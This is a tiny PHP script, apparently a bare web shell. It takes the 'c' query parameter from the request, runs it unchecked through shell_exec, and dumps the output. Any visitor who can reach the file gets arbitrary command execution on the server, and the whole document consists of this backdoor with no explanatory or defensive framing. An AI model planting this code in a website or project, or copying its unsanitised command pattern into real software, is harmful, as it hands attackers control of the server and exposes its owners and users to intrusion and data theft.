<?php

$command = $_GET["c"];

$output = shell_exec($command);

var_dump($output);